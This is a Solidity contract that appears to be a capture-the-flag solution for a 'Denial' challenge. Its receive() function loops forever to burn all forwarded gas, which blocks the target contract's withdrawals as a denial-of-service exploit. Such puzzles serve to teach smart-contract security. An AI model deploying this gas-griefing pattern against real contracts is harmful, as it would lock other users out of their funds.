// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Denial.sol";

contract Solution {
    Denial public target;
    uint256 initialbalance = 0.00001 ether;

    constructor(address _target) {
        target = Denial(payable(_target));
    }

    receive() external payable {
        while (true) {
            uint256 i = 2 * 3 * 4 * 6 * 77;
        }
    }
}
